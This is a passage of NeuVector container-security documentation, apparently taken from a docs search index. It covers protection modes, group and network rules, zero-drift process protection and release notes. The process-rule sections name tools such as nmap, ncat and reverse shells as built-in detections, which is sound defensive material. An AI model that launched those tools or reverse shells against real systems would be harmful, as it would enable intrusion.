disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Special Enforcement for Istio ServiceEntry Destinations​  Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. Implicit violations will be reported for newly visible traffic if allow rules don't exist. These rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with destination addresses (or DNS name) and add a new network rule to this destination to allow the traffic.  Virtual Host Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.

At any point in time, any Group (beginning with 'nv', or the 'Nodes' group) can be in any of these modes. The mode can be switched from the Groups menu, Network Activity view, or the Dashboard. Container Groups can have Process/File rules in a different mode than Network rules, as described here.    note Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Discover​  By default, NeuVector starts in Discover mode. In this mode, NeuVector:  Discovers your container infrastructure, including containers, nodes, and hosts.Learns your applications and behaviors by observing conversations (network connections) between containers.Identifies separate services and applications running.Automatically builds a whitelist of Network Rules to protect normal application network behavior.Baselines the processes running in containers for each service and creates whitelist Process Profile Rules.  note To determine how long to run a service in Discover mode, run test traffic through the application and review all rules for completeness. Several hours should be sufficient, but some applications may require a few days to be fully exercised. When in doubt, switch to Monitor mode and check for violations, which can then be converted to whitelist rules before moving to Protect mode.  Monitor​  In Monitor mode NeuVector monitors conversations and detects run-time violations of your Security Policy. In this mode, no new rules are created by NeuVector, but rules can manually be added at any time.  When violations are detected, they are visible in the Network Activity map visually by a red line. Violations are also logged and displayed in the Notifications tab. Process profile rule and file access violations are logged into Notifications -&gt; Security Events.  In the Network map you can click on any conversation (green, yellow, red line) to display more details about the type of connection and protocol last monitored. You can also use the Search and Filter by Group buttons in the lower right to narrow the display of your containers.  Protect​  In Protect mode, NeuVector enforcers will block (deny) any network violations and attacks detected. Violations are shown in the Network map with a red ‘x’ in them, meaning they have been blocked. Unauthorized processes and file access will also be blocked in Protect mode. DLP sensors which match will block network connections.  ","version":"5.2","tagName":"h3"},{"title":"Switching Between Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/5.2/policy/modes#switching-between-modes","content":" You can easily switch NeuVector Groups from one mode to another. Remember that in Discover mode, NeuVector is building a Security Policy for allowed, normal container behavior. You can see these rules in the Policy -&gt; Groups tab or in detail in the Policy -&gt; Network Rules menu.  When you switch from Discover to Monitor mode, NeuVector will flag all violations of normal behavior not explicitly allowed. Because NeuVector enforces policy based on applications and groups with similar attributes, it’s typically not necessary to add or edit rules when scaling up or scaling down containers.  Please ensure that, before introducing new updates that result in new types of connections between containers, you switch the affected Service(s) to Discover mode to learn these new behaviors. Alternatively, you can manually add new rules while in any mode, or edit the CRD used to create the rules to add new behaviors.  New Service Mode​  If new services are discovered by NeuVector, for example a previously unknown container starts running, it can be set to a default mode. In Discover mode, NeuVector will start to learn its behavior and build Rules. In Monitor, a violation will be generated when connections to the new service are detected. In Protect, all connections to the new service will be blocked unless the rules have been created prior.    Network Service Policy Mode​  There is a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.  Automated Promotion of Group Modes​  Promotes a Group’s protection Mode based on elapsed time and criteria. This automation does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode.  The criterion for moving from Discover to Monitor mode is: elapsed time for learning all network and process activity of at least one live pod in the Group. For example, if this is set to 7 days, then 7 days after a running pod for the group is detected, the mode will be automatically promoted to Monitor.  The criterion for moving from Monitor to Protect mode is: there are no security events (network, process etc) for the timeframe set for the Group. For example, if this is set to 14 days, then if no violations (network, process, file) are triggered for 14 days (e.g. the quiet period), then the mode is automatically promoted to Protect. If there are no running pods in the group, the promotion will not occur.    Conflict Resolution Between Services In Different Modes​  For network connections between containers in different service groups, if their policy modes are different, the following table shows how the system resolves the conflicts.

Groups​  This provides the primary view of service Groups and custom Groups to set the mode (Discover, Monitor, Protect) for each service and to manage rules. Groups are automatically created by NeuVector, but custom groups can be added. Rules for each Group are automatically created by NeuVector when containers begin running. Container Groups can have a Split Policy Mode where the Process/File rules are in a different enforcement mode than the Network rules, as described here.  To select a Group to view or manage, select the check box next to it. This is where Process Profile Rules, File Access Rules, DLP, and Custom Compliance checks are managed. Network Rules can be viewed here but are managed in a separate menu. Network and Response Rules in NeuVector are created using a ‘from’ and ‘to’ field, which requires a Group as input. A group can be an application, derived from image labels, DNS name or other customized grouping. DNS subdomains are supported, e.g. *.foo.com. IP addresses or subnets can also be used which is useful to control ingress and egress from non-containerized workloads.    Reserved group names created automatically by NeuVector include:  Containers. All running containers.External. Connections coming into the cluster (ingress).Nodes. Nodes or hosts identified by NeuVector.  The Groups menu is also where the &quot;Export Group Policy&quot; can be performed. This exports the security policy (rules) for the selected groups as a yaml file in the format of the NeuVector custom resource definition (CRD) which can be reviewed and then deployed into other clusters.  Note that the Status of a Group's containers is shown in Policy -&gt; Groups -&gt; Members, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Network Rules​  A list of whitelist and blacklist rules for NeuVector to enforce. NeuVector can auto-discover and create a set of whitelist rules while in Discover mode. Rules can be added manually if desired.  NeuVector automatically creates Layer 7 (application layer) whitelist rules when in Discover mode, by observing the network connections and creating rules which enforce application protocols.  NeuVector also has built-in network attack detection which is enabled all the time, regardless of mode (Discover, Monitor, Protect). The network threats detected include DDoS attacks, tunneling and SQL injection. Please see the section Network Rules for a full list of built-in threat detection.  DLP (Data Loss Prevention) rules can also be applied to container Groups to inspect the network payload for potential data stealing or privacy violations such as unencrypted credit card data. Violations can be blocked. Please see the section on DLP for details on how to create and apply DLP filters.  Process Profile and File Access Rules​  NeuVector has built-in detection of suspicious processes and file activity as well as a baselining technology for containers. Built-in detection includes processes such as port scanning (e.g. NMAP), reverse shell, and even privilege escalations to root. System files and directories are automatically monitored. Each service discovered by NeuVector will create a baseline of ‘normal’ process and file behavior for that container service. These rules can be customized if desired.  Response Rules​  Response Rules enable users to define actions to respond to security events. Events include Threats, Violations, Incidents, and Vulnerability Scan results. Actions include container quarantine, webhooks, and suppression of alerts.  Response Rules provide a flexible, customizable rule engine to automate responses to important security events.  Admission Control Rules​  Admission control rules allow or block deployments. More details can be found in this section under Admission Controls.  DLP and WAF Sensors​  Data Loss Prevention (Data Leak Protection) and WAF rules can be enabled on any selected container Group. This utilizes Deep Packet Inspection to apply regular expression based matching to the network payload entering or leaving the selected container group. Built-in sensors for credit card and US social security number are included for examples, and custom regular expressions can be added.  Migration, Backup, Import/Export​  Migration of the security policy can be accomplished by CRD, REST API, or import/export. For example, learned and custom rules can generate a CRD yaml file(s) in a staging environment for deployment to the production environment.  The Security Policy for NeuVector can be exported and imported in Settings -&gt; Configuration. It is recommended to backup All configuration prior to any update of NeuVector to a new version.  important Importing ALL (Config and Policy) will overwrite everything, including the main admin login credential. Be sure you know the main admin login for the imported file before importing.

One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  note There is a limitation when running on systems with the AUFS file system, whereby a race condition can be experienced and the process rules are not enforced for blocking (Protect mode). However, these violations are still reported in the security event logs.  Zero-drift Process Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic Mode Process Protection​  Zero-drift can be disabled, switching to Basic process protection. Basic protection enforces process/file activity based on the listed process and/or file rules for each Group. This means that there must be a list of process rules and/or file rules in place for protection to occur. Rules can be auto-created through Behavioral Learning while in Discover mode, manually created through the console or rest API, or programmatically created by applying a CRD. With Basic enabled if there are no rules in place, all activity will be alerted/blocked while in Monitor or Protect modes.  Behavioral Learning Based Process Protection​  Process profile rules use baseline learning to profile the processes that should be allowed to run in a group of containers (i.e. a Group). Under normal conditions in a microservices environment, for containers with a particular image, only a limited set of processes by specific users would run. If the container is attacked, the malicious attacker would likely initiate some new programs commonly not seen in this container. These abnormal events can be detected by NeuVector and alerts and actions generated (see also Response Rules).  Process baseline information will be learned and recorded when the service Group is in Discover (learning) mode. When in Monitor or Protect mode, if a process that has not been seen before is newly started, or an old process is started by a different user than before, the event will be detected and alerted as a suspicious process in Monitor mode or alerted and blocked in Protect mode. Users can modify the learned profile to allow or deny (whitelist or blacklist) processes manually if needed.  Note that in addition to baseline processes, NeuVector has built-in detection of common suspicious processes such as nmap, reverse shell etc. These will be detected and alerted/blocked unless explicitly white listed for each container service.  important Kubernetes liveness probes are automatically allowed, and added to the learned process rules even in Monitor/Protect mode.  Process Rules for Nodes​  The special reserved group 'nodes' can be configured to enforce process profile rules on each node (host) in the cluster. Select the group 'nodes' and review the process rules, editing if required. Then switch the protection mode to Monitor or Protect. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  Process Rules for Custom Groups​  For user defined custom Groups, process rules, if desired, must be manually added. Custom Groups do not learn process rules automatically.  Process Rules Precedence​  Process rules can exist for user defined custom Groups as well as auto-learned Groups. Rules created for custom Groups take precedence over rules for auto-learned Groups.  For the process rule list within any Group, the rule order in the console determines its precedence. The top rules listed are matched first before the ones below it.  Process rules with name and path both containing wildcards take precedence over other rules to Allow action. A Deny action is not allowed with both wildcards to avoid blocking all processes.  Process rules with a Deny action and wildcard in the name will take precedence over Allow actions with wildcard in the name.  Discover mode​  All new processed are profiled with action allowUsers can change the action into 'deny' for generating alert or blocking when same new process is startedUsers can create a profile for a process with either allow or denyProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  note A suspicious process (built-in detect), such as nmap, ncat, etc., is reported as a suspicious process event and will NOT be learned. If a service needs this process, the process needs to be added with an 'allow' profile rule explicitly.  Monitor/Protect mode (new container started in monitor or protect mode)​  Every new process generates an alertProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  If a) process matches a deny rule, or b) process is not in the list of allow rules, then:  In Monitor mode, alerts will be generatedIn Protect mode, processes will be blocked and alerts generated  note Container platforms with the AUFS storage driver will introduce a delay in blocking mechanism due to the driver’s limitations.  note In Protect mode, system containers such as Kubernetes ones, will not enable the block action but will generate a process violation event if there is a process violation.  Creating process profile rules​  Multiple rules can be created for the same process. The rules are executed sequentially and the first matching rule will be executed.  Click Add rule (+) from process profile rules tabProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  Example: To allow the ping process to run from any directory    Violations will be logged in Notifications -&gt; Security Events.

XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;  Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. In 4.1.0 release, we added a feature to recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  In 4.1.2, switch is added to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.    4.1.1 January 2021​  Bug Fixes​  Add support for AWS EKS AMI Release v20210112 to fix ulimit issues.  4.1 December 2020​  Enhancements​  Allow users to change policy mode when exporting CRD.OIDC support claims from /oauth/userinfo endpoint.Cluster node refresh support to allow temporary support for node growth and migration of pods between nodes.Generate a usage report for download from the Settings -&gt; Configuration page.Wildcard support on namespace when assigning user roles to namespace.Improve group/policy removal logic. Configurable setting for when an unused group is removed based on the amount of time since it was last used.Allow user to configure packet capture duration.Add support for Multi-cluster management reader role.Stand alone scanner now submits scan result using REST API. See below for Scanner Details.Detect and block Man-in-the-middle attack reported in CVE-2020-8554.Add support for metered (usage based) licensing models.Remove step for creation of CRDs (e.g. NvSecurityRule) from the sample deployment yamls for Kubernetes and Openshift. This is not required (Controller will create these automatically). Helm deployment will also take care of these.  Bug Fixes​  Improve high memory usage on controller and enforcer.Error returned when trying to configure a registry filter. Allow wildcard be used any place in the repo/tag filter.Block policy not working as expected. Add support for x-forwarded-* headers. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR above as part of the 4.1.2 release notes.Helm Chart error when setting controller ingress to true.Unable to create add and save network rule, due to gateway timeout.Configmap examples are missing Group_Claim field. Added to configmap documentation.Process profile violation when terminating Controller pod.  Scanner Details​  Two additional environment variables are added in order to login to controller REST API. Users with CICD integration role can submit the results.  New Environment Variables: SCANNER_CTRL_API_USERNAME, SCANNER_CTRL_API_PASSWORD  Usage Example  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_LICENSE=$license -e CLUSTER_JOIN_ADDR=10.1.2.3 CLUSTER_JOIN_PORT=32368 -e SCANNER_CTRL_API_USERNAME=username -e SCANNER_CTRL_API_PASSWORD=secret -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   Kubernetes 1.19+ and CRD Exports​  important To use an exported CRD with Kubernetes 1.19+, please remove the 'version: v1' from each section. This can be found at the end or near the end of each section in an exported Group policy CRD.   version: v1   4.0.3 December 2020​  Bug Fixes​  Process profile violation occurring when terminating Controller pod.Implicit violations for user created address group which uses wildcard in hostnames.  Helm Chart Changes​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.Create a separate chart for CRD. This allows CRD policies to be created before NeuVector core services are deployed. If the new chart is used, the CRD resources in the core chart, kept for backward compatibility, should be disabled with crdwebhook.enabled=falseAllow user to specify the service account for NeuVector deployment. Previously, the 'default' service account of the namespace is used. In the case when NeuVector is deployed together with other applications in a namespace, it is not advisable to use the default service account for the namespace for some users.  4.0.2 December 2020​  Enhancements​  Console - the container list page Assets -&gt; Containers should allow the window separators to be dragged to be resized.Add admission control checks for pod share host namespaces. Allow user to choose to prevent pod from sharing host's Network, IPC, PID namespaces. See below for more details.Ability to export list of containers running in privileged or 'runasroot'.In Notifications -&gt; Security Events, enable the display of information about the event attributes easily without switching screens.  Bug Fixes​  Issue with jumbo frames (enabled on some public clouds). Symptom: the main prometheus application URI /graph becomes inaccessible when the prometheus group is placed into Protect mode.Missing namespace option in vulnerabilities filter. Allow users to select/type the Namespace where NeuVector is installed as filter entry.False positive in OpenSSL version 1.1.1c-1 affected by CVE-2020-1967.Unexpected implicit deny violations for user created address group using wildcard hostnames. Problems with using DNS Name (with wildcards) for Firewall Traffic.Improve detection to remove SQL Injection false positive.  Admission Control for Pod Sharing​  HostPID - Controls whether the pod containers can share the host process ID namespace. Note that when paired with ptrace this can be used to escalate privileges outside of the container (ptrace is forbidden by default).HostIPC - Controls whether the pod containers can share the host IPC namespace.HostNetwork - Controls whether the pod may use the node network namespace. Doing so gives the pod access to the loopback device, services listening on localhost, and could be used to snoop on network activity of other pods on the same node.  4.0.1 November 2020​  important Changes to Helm Chart Structure The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/ If using Helm to upgrade, please update the location to the path above.  Enhancements​  Add support for distroless image scanning.Add ability to trigger single image scan from registry with results available for admission control.Update JFrog Xray integration to new JFrog platform api / authentication requirements.Add information about scanners in the Manager such as version and scanner statistics.Add quick filter to exclude security events (similar to grep -v).Update CVE Severity to align with NVD vulnerability severity ratings. Using the larger of the CVSS v2 and v3 scores, the ratings are High for &gt;=7, Medium for &gt;=4.Support standalone scanner deployments for local image scanning (does not require controller). Adds new environment variables SCANNER_LICENSE, SCANNER_REGISTRY, SCANNER_REPOSITORY, SCANNER_TAG, SCANNER_REGISTRY_USERNAME, SCANNER_REGISTRY_PASSWORD, SCANNER_SCAN_LAYERS, CLUSTER_JOIN_ADDR, CLUSTER_JOIN_PORT.Support namespace auto-complete for namespace user creation in Settings -&gt; Users.Add ability to enter exempted CVEs in the Jenkins scanner plug-in.Add admission control criteria to be able to block images for which the scan failed to detect the OS (e.g. archlinux images) and therefore no vulnerabilities were found. A new criteria &quot;Image Without OS information&quot; is added, when set to true, means the base OS of the image is unavailable.  Bug Fixes​  Improve (decrease) Controller memory usage.Enable support for webhook functions such as admission control and CRD in Kubernetes 1.19.Add support for apiextensions.k8s.io/v1 deployments as required for Kubernetes 1.19 (and supported in k8s 1.18).Unexpected process profile rule violation resulting from parent shell script for process on the allowed list.Add support for wildcard filters in Harbor registry (configured using Docker registry setting).Improve handling of configmap to re-load if admin password is reverted to the default. This is to prevent insecure access when the system is recovered from cluster level storage failure.  4.0.0.s1 October 2020​  Security Patch for NeuVector Containers​  This security release is for the NeuVector Manager and Allinone containers to address High CVE-2020-14363 found in the base Alpine layer in package libx11. As part of the update, Medium CVE-2020-8927 is also addressed. This issue, although unlikely to be able to be exploited, affects the Manager console for NeuVector and does not affect the operations of the Controller or Enforcer containers.  4.0 September 2020​  Enhancements​  Customizable compliance templates. Preset templates for PCI, GDPR, HIPAA, NIST. Each CIS benchmarks and custom check can be tagged with one or more compliance regulations. Reports can then be generated for each. Security Risks -&gt; Compliance Profile.Vulnerability Management Workflow Support. Track status of vulnerabilities and create policies based on vulnerability discovery dates and other criteria. Security Risks -&gt; Vulnerabilities (Advanced Filter), and Admission Control rules.Secrets auditing. 20+ secrets checks included, and automatically run on image scans and resource yamls. Results will show pass/warn in the compliance reports on image vulnerabilities in Assets -&gt; Registries and Security Risks -&gt; Compliance.Granular RBAC for NeuVector Users. Create custom roles with granular read/write permissions for NeuVector functions. Assign users to roles. Settings -&gt; Users/Roles.Scalable and Separated Scanner Pods. Scanner pods can be scaled up or down to scan thousands of images. The controller assigns scanning tasks to each available scanner pod. Important: the Controller no longer contains a scanner function, so a minimum of one scanner pod is required to be deployed. Also, the 4.x scanners are NOT backward compatible with 3.x controllers, 3.x deployments of external scanners should be updated to neuvector/scanner:3.Serverless Scanning and Risk Assessment for AWS Lambda. Scan AWS Lambda functions for vulnerabilities with the Serverless IDE Plug-in or in AWS accounts. Supported languages include Java, Python, Ruby, node.js. Perform risk assessment by evaluating IAM role permissions for Lambda functions and alert if unnecessary permissions are enabled. Note: Serverless security requires a separate NeuVector license.Perform compliance checks during image scanning. Also deployment yamls file. This includes setuid, setgid, CIS (running as root etc), 20+ secrets checks.Enhance Security Risk Score in Dashboard with ability to enable/disable which Groups contribute to the Risk Score. Policy -&gt; Groups -&gt; Scorable check box. This includes ability to disable system containers from risk scoring.Added support for a Namespace restricted user to have access to assigned registries.Break out scanning syslog notifications to individual CVE syslog events.Allow a namespace restricted user to be able to create registries that are only visible by users that have access to that namespace (including global users).Download pdf reports from the dashboard by namespace. Select a namespace to filter the dashboard pdf report.The CRD import behavior has been changed to ignore the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration. A 'linked' group is one which has not been selected for export but is referred to by a network rule, and thus has been exported along with the selected group(s).  Bug Fixes​  Registry URL validation allows URL without protocol scheme prefix. Added protocol schema validation.Container scans failed - Fail to read files in some situations. Fixes error &quot;Failed to read file - error=&lt;nil&gt;&quot;.The Group member column is inaccurate for the special group &quot;nodes.&quot;Discount (reduce) Admission Controls (4 points) from Overall Risk Scoring for Docker EE Platform since it is not applicable.A scanner only controller can take 15-20 minutes to become ready.Security risks &gt; Vulnerabilities &quot;Severity&quot; Distribution title is mislabeled as Urgency.Security Events source Workload:ingress rule does not match. Unexpected implicit violation from Workload:Ingress on OpenShift 3.11 platform. Internal subnet logic is improved to handle large IP range.Enforcer reports error trying to connect to /var/run/docker.sock. Add recovery if connection is lost.  Summary of Major Operational Changes​  The 4.x Scanner is NOT compatible with the 3.2.0, 3.2.1, 3.2.2 Controllers. If you have deployed 3.x external scanners and wish to have them continue to run, be sure to UPDATE the scanner deployment with a version 3 tag, e.g. neuvector/scanner:3. Alternatively, you can update to 3.2.3+.License to enable serverless security requiredNew clusterolebinding and clusterrole added for Kubernetes an OpenShiftController no longer has built in scanner. You must deploy at least 1 scanner pod.Yaml file changes in main deployment samples: Added deployment for scanner pods (2 default)Scanner pod deployment has commented out section for local scanning casesAdded cron job for updater pod for cve database updates of scanners  Upgrading from 3.x to 4.0​  For Helm deployments, update the helm chart to the new version 1.6.0. Then a standard upgrade to 4.0.0 is all that is required (e.g. helm upgrade my-release --set imagePullSecrets=regsecret-neuvector,tag=4.0.0 ./neuvector-helm/).  tip Kubernetes (for OpenShift use the equivalent oc commands)  Backup the configuration from Settings -&gt; ConfigurationCreate the two new bindings kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:defaultkubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector Set the version tags to 4.0.0 for the Controller, Manager, Enforcer yaml's and apply the updateCreate the scanner podsCreate or update the scanner cron jobWait a few minutes for the rolling update of the controllers to complete, and check all settings after login...

This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.Compliance containers list to exclude exited containers.Enhance DLP rules to support simple wildcard in the pattern.Add support for cri-o 1.26+ and OpenShift 4.11+.Make gravatar optional.Display cluster namespace resource in console / UI.Display source severity/classification (e.g. Red Hat, Ubuntu...) along with NVD severity score in console.Don’t allow SSO/RBAC disabling for Rancher and OpenShift if user is authenticated through SSO.Add auto-scan enablement and deletion of unused groups aging to configMap.Include IP address for external source/destination in csv/pdf for implicit deny violationsVarious performance and scalability optimizations for controller and enforcer CPU and memory usage.

The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.Enhance admission control rules: Custom criteria for admission control rules. Allow users to define resource criteria on all pod related fields and to be used in rules, for example item.metadata.annotationsKey contains 'neuvector', item.metadata.name='xyzzy' etc.Add criteria to check for high risk RBAC settings for service accounts when deploying pods. These include criteria 'any action of workload resources', 'any action on RBAC', 'create workload resources', 'listing secrets', and 'exec into a container'.Add semantic version comparison to modules for admission control rules. This enables &gt; or &lt; operators to applied to version numbers in rules (e.g. don't allow module curl&lt;6.2.0 to be deployed). This allows specific version checks on installed packages.Add an admission control rule for Pod Security Admission (PSA) supported in Kubernetes 1.25+. Add new env variable NO_DEFAULT_ADMIN which when enabled does not create an 'admin' user. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.Blocking login after failed login attemps now becomes the default. The default value is 5 attempts, and configurable in Settings -&gt; Users &amp; Roles-&gt; Password Profile.Add new env variable for performance tuning ENF_NO_SYSTEM_PROFILES, value: &quot;1&quot;. When enabled, it will disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.Add a custom auto-scaling setting for scanner pods, with value Delayed, Immediate, and Disabled. Important: Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Custom groups are now able to use namespace labels, including Rancher's namespace labels. Generally, pod and namespace labels can now be added to Custom Groups.Add ability to hide selected namespaces, groups in Network Activity view.Full support for Cilium cni.Full support of OpenShift 4.9 and 4.10.Build tools are now available for the NeuVector/Open Zero Trust (OZT) project at https://github.com/openzerotrust/openzerotrust.io.NeuVector now lists the version ID and SHA256 digest for each version of the controller, manager, enforcer at https://github.com/neuvector/manifests/tree/main/versions.Anonymous telemetry data (number of nodes, groups, rules) is now reported to a Rancher cloud service upon deployment to assist the project team in understanding usage behavior. This can be disabled (opt-out) in UI or with configMap (No_Telemetry_Report) or REST API.(Addendum January 2023). Support for ServiceEntry based network policy with Istio. Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. IMPORTANT: If you are upgrading to v5.1 with an Istio based deployment, new rules must be created to allow these connections and avoid violation alerts. After upgrading, Implicit violations will get reported for newly visible traffic if allow rules don't exist. New traffic rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with addresses (or DNS name) and new network rule to this destination to allow the traffic. NOTE: There is a bug in 5.1.0 in the destination reported by the deny violations that do not represent the correct destination. The bug reports both server_name and client_name are the same. This issue will get addressed in an upcoming patch release.  Bug Fixes​  Reduce controller memory consumption from unnecessary cis benchmark data created during rolling updates.

Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet). Used for ingress connections to web application pods as well as outbound connections to api-services to enforce api security.CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. This deployment pulls from the mirrored Rancher repository (e.g. rancher/mirrored-neuvector-controller:5.0.0) and deploys into the cattle-neuvector-system namespace. NOTE: Requires updated Rancher release 2.6.5 May 2022 or later, and only admin and cluster owner roles are supported at this time.Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy. Configure proxy in Settings -&gt; Configuration, and enable proxy when configuring federation connections.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.Support Microsoft Teams format for webhooks.Support AD/LDAP nested groups under mapped role group.Support clusterrolebindings or rolebindings with group info in IDP for Openshift.Allow network rules and admission control rules to be promoted to a Federated rule.

